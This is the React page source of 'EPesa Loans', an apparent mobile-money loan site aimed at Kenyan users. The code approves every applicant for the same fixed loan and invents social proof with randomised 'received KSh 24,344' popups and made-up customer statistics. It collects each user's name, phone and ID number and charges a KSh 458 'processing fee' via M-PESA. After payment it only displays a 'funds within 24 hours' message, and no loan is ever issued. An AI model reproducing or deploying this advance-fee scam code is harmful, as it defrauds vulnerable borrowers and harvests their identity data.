"use client";

import { useState, useEffect } from "react";

const BACKEND_URL =
  "https://starlink-backend-yb3n.onrender.com/api/runPrompt";

export default function Home() {
  const [page, setPage] = useState("home");
  const [loading, setLoading] = useState(false);

  const [form, setForm] = useState({
    name: "",
    phone: "",
    id: "",
    loanType: "",
  });

  const [popup, setPopup] = useState<any>(null);

  // ✅ NEW: payment popup
  const [paymentPopup, setPaymentPopup] = useState(false);

  const names = [
    "Brian M.",
    "Kevin O.",
    "Faith W.",
    "Sharon K.",
    "Dennis N.",
    "Mercy A.",
    "Victor G.",
    "James T.",
  ];

  const times = [
    "2 mins ago",
    "5 mins ago",
    "12 mins ago",
    "32 mins ago",
    "1 hour ago",
    "2 hours ago",
  ];

  useEffect(() => {
    if (page !== "result") return;

    const interval = setInterval(() => {
      const randomName = names[Math.floor(Math.random() * names.length)];
      const randomTime = times[Math.floor(Math.random() * times.length)];

      setPopup({
        name: randomName,
        time: randomTime,
        amount: "KSh 24,344",
      });

      setTimeout(() => {
        setPopup(null);
      }, 4000);
    }, 7000);

    return () => clearInterval(interval);
  }, [page]);

  const handleChange = (e: any) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const normalizePhone = (phone: string) => {
    if (phone.startsWith("07")) return "254" + phone.slice(1);
    if (phone.startsWith("01")) return "254" + phone.slice(1);
    if (phone.startsWith("254")) return phone;
    return phone;
  };

  const validatePhone = (phone: string) => {
    return /^(07|01|254)\d{8,9}$/.test(phone);
  };

  const handleSubmit = () => {
    if (!form.name || !form.phone || !form.id || !form.loanType) {
      alert("Fill all fields");
      return;
    }

    if (!validatePhone(form.phone)) {
      alert("Invalid Kenyan number");
      return;
    }

    setPage("result");
  };

  const handlePayment = async () => {
    setLoading(true);

    const phone = normalizePhone(form.phone);

    try {
      const res = await fetch(BACKEND_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone,
          amount: 458,
          local_id: Date.now().toString(),
          transaction_desc: "EPesa Loan Processing Fee",
          till_id: "EPESA001",
        }),
      });

      const data = await res.json();

      if (!data.status) {
        alert(data.msg || "Payment failed");
        setLoading(false);
        return;
      }

      setPage("processing");

      // ✅ SHOW PROFESSIONAL POPUP
      setTimeout(() => {
        setPaymentPopup(true);
      }, 1500);

    } catch (err) {
      alert("Payment failed. Try again.");
      setLoading(false);
    }
  };

  // ================= PROCESSING =================
  if (page === "processing") {
    return (
      <div className="min-h-screen flex flex-col justify-center items-center bg-gradient-to-br from-green-600 to-green-800 text-white">

        <div className="bg-white/10 backdrop-blur-xl p-8 rounded-3xl text-center border border-white/20">
          <div className="text-5xl mb-4">💰</div>
          <h1 className="text-2xl font-bold mb-2">
            Processing Payment
          </h1>
          <p className="opacity-90 animate-pulse">
            Please wait...
          </p>
        </div>

        {/* ✅ PROFESSIONAL PAYMENT POPUP */}
        {paymentPopup && (
          <div className="fixed bottom-6 left-1/2 -translate-x-1/2 bg-white text-black px-6 py-4 rounded-2xl shadow-2xl border border-gray-200 max-w-sm w-[90%] text-center animate-fadeIn">
            <div className="text-lg font-bold mb-1">✅ Payment Received</div>
            <p className="text-sm">
              Your payment is being processed.
              <br />
              Funds will reflect within <b>24 hours</b>.
            </p>
          </div>
        )}

      </div>
    );
  }

  // ================= FORM =================
  if (page === "form") {
    return (
      <div className="min-h-screen flex items-center justify-center text-white bg-gradient-to-br from-blue-700 via-purple-700 to-pink-600 p-4">
        <div className="w-full max-w-md bg-white/10 backdrop-blur-xl p-6 rounded-3xl border border-white/20 shadow-xl space-y-4">

          <button onClick={() => setPage("home")} className="text-sm opacity-70">
            ← Back
          </button>

          <div className="text-center">
            <div className="text-4xl">⚡</div>
            <h2 className="text-xl font-bold mt-2">Apply for Your Loan</h2>
            <p className="text-sm opacity-80">
              Fast approval in minutes
            </p>
          </div>

          <input name="name" placeholder="Full Name" onChange={handleChange} className="w-full p-3 rounded-xl bg-white/20 outline-none" />
          <input name="phone" placeholder="Phone (07 / 01 / 254)" onChange={handleChange} className="w-full p-3 rounded-xl bg-white/20 outline-none" />
          <input name="id" placeholder="ID Number" onChange={handleChange} className="w-full p-3 rounded-xl bg-white/20 outline-none" />

          <select name="loanType" onChange={handleChange} className="w-full p-3 rounded-xl bg-white text-black font-medium">
            <option value="">Select Loan Type</option>
            <option>Personal Loan</option>
            <option>Business Loan</option>
            <option>Emergency Loan</option>
          </select>

          <button onClick={handleSubmit} className="w-full py-3 rounded-full font-bold bg-gradient-to-r from-pink-500 to-purple-500 shadow-lg">
            ⚡ Check My Eligibility
          </button>
        </div>
      </div>
    );
  }

  // ================= RESULT =================
  if (page === "result") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-700 via-purple-700 to-pink-600 p-4 text-white flex items-center justify-center">

        <div className="w-full max-w-md space-y-4">

          <div className="bg-white/10 backdrop-blur-xl p-6 rounded-3xl text-center border border-white/20">
            <div className="text-4xl mb-2">✅</div>
            <h2 className="text-lg font-bold">
              Congratulations {form.name}! 🎉
            </h2>
            <p className="text-sm opacity-90">
              You're eligible for a loan
            </p>
          </div>

          <div className="space-y-3">
            <Card label="Loan Type" value={form.loanType} />
            <Card label="Principal Amount" value="KSh 24,344" pink />
            <Card label="Interest Amount" value="KSh 2,434" pink />
            <Card label="Loan Term" value="30 Days" />
            <Card label="Total Repayment" value="KSh 26,778" green />
            <Card label="Processing Fee" value="KSh 458" yellow />
          </div>

          <div className="bg-gradient-to-r from-pink-500 to-purple-600 p-5 rounded-2xl space-y-3 shadow-xl">
            <p className="font-bold text-lg">⚡ Complete to Receive Funds</p>

            <p className="text-sm">
              Pay <b>KSh 458</b> processing fee to receive your loan instantly.
            </p>

            <button onClick={handlePayment} disabled={loading} className="w-full bg-white text-black py-3 rounded-xl font-bold">
              {loading ? "Processing..." : "💳 Pay KSh 458"}
            </button>

            <p className="text-xs opacity-80 text-center">
              M-PESA → {normalizePhone(form.phone)}
            </p>
          </div>

        </div>

        {popup && (
          <div className="fixed top-5 left-1/2 -translate-x-1/2 bg-black/80 text-white px-5 py-3 rounded-2xl shadow-2xl backdrop-blur-lg border border-white/20 animate-slideDown">
            <p className="text-sm">
              💸 <b>{popup.name}</b> received <b>{popup.amount}</b>
            </p>
            <p className="text-xs opacity-70">{popup.time}</p>
          </div>
        )}

      </div>
    );
  }

  // ================= HOME =================
  return (
    <div className="min-h-screen text-white bg-gradient-to-br from-blue-700 via-purple-700 to-pink-600 p-4">

      <div className="text-center mt-10">
        <div className="inline-block px-4 py-2 rounded-full bg-white/20 text-sm mb-4">
          ⚡ Lightning Fast Approvals
        </div>

        <h1 className="text-3xl font-bold">
          <span className="text-purple-300">EPesa</span> Loans
        </h1>

        <p className="mt-4 text-lg">
          Instant Cash, <span className="text-yellow-300 font-semibold">Zero Hassle</span>
        </p>

        <p className="mt-3 text-sm opacity-80">
          Get up to <span className="text-green-300 font-bold">KSh 50,000</span> in minutes.
        </p>

        <button
          onClick={() => setPage("form")}
          className="mt-6 px-6 py-3 rounded-full font-bold bg-gradient-to-r from-pink-500 to-purple-500 shadow-lg"
        >
          Get My Loan Now →
        </button>
      </div>

      <div className="mt-8 space-y-4">

        <div className="bg-white/10 p-6 rounded-2xl text-center border border-white/20 backdrop-blur-xl">
          📈
          <h2 className="text-xl font-bold mt-2">30,000+</h2>
          <p className="text-sm opacity-80">Happy Customers</p>
        </div>

        <div className="bg-white/10 p-6 rounded-2xl text-center border border-white/20 backdrop-blur-xl">
          ⏱️
          <h2 className="text-xl font-bold mt-2">2 Minutes</h2>
          <p className="text-sm opacity-80">Average Approval</p>
        </div>

        <div className="bg-white/10 p-6 rounded-2xl text-center border border-white/20 backdrop-blur-xl">
          🔒
          <h2 className="text-xl font-bold mt-2">100%</h2>
          <p className="text-sm opacity-80">Secure & Safe</p>
        </div>

      </div>

      <div className="mt-8 space-y-4">
        <Feature icon="📱" title="Mobile First" desc="Apply directly from your phone" />
        <Feature icon="💳" title="Direct to M-PESA" desc="Money sent instantly to your wallet" />
        <Feature icon="⚡" title="Instant Decision" desc="Know your approval status immediately" />
        <Feature icon="👥" title="24/7 Support" desc="We're here whenever you need us" />
      </div>

     <div className="mt-10 bg-black/30 backdrop-blur-xl border-t border-white/20 rounded-t-3xl p-6 text-sm text-white space-y-6">

  {/* COMPANY */}
  <div className="text-center">
    <h2 className="text-lg font-bold">EPesa Loans</h2>
    <p className="opacity-80">
      Fast, secure and reliable mobile loans anytime.
    </p>
  </div>

  {/* CONTACT */}
  <div className="text-center space-y-1">
    <p>📞 Support: <span className="font-semibold">0755 997 593</span></p>
    <p>📧 Email: <span className="font-semibold">support@epesaloans.site</span></p>
    <p>⏰ Available: 24/7 Customer Support</p>
  </div>

  {/* LINKS */}
  <div className="flex justify-center gap-6 text-xs opacity-80">
    <span className="cursor-pointer hover:underline">Terms & Conditions</span>
    <span className="cursor-pointer hover:underline">Privacy Policy</span>
    <span className="cursor-pointer hover:underline">Help Center</span>
  </div>

  {/* TRUST */}
  <div className="text-center text-xs opacity-70">
    🔒 Secure Transactions | 📱 M-PESA Integrated | ✅ Trusted by 30,000+ Users
  </div>

  {/* COPYRIGHT */}
  <div className="text-center text-xs opacity-60">
    © {new Date().getFullYear()} EPesa Loans. All rights reserved.
  </div>

</div>

    </div>
  );
}

function Feature({ icon, title, desc }: any) {
  return (
    <div className="bg-white/10 p-6 rounded-2xl text-center border border-white/20 backdrop-blur-xl">
      <div className="text-2xl">{icon}</div>
      <h3 className="font-bold mt-2">{title}</h3>
      <p className="text-sm opacity-80">{desc}</p>
    </div>
  );
}

function Card({ label, value, pink, green, yellow }: any) {
  let color = "bg-white/10";

  if (pink) color = "bg-pink-500/20";
  if (green) color = "bg-green-500/20 border border-green-400";
  if (yellow) color = "bg-yellow-400/20 border border-yellow-300";

  return (
    <div className={`${color} p-4 rounded-xl flex justify-between`}>
      <span>{label}</span>
      <span className="font-bold">{value}</span>
    </div>
  );
}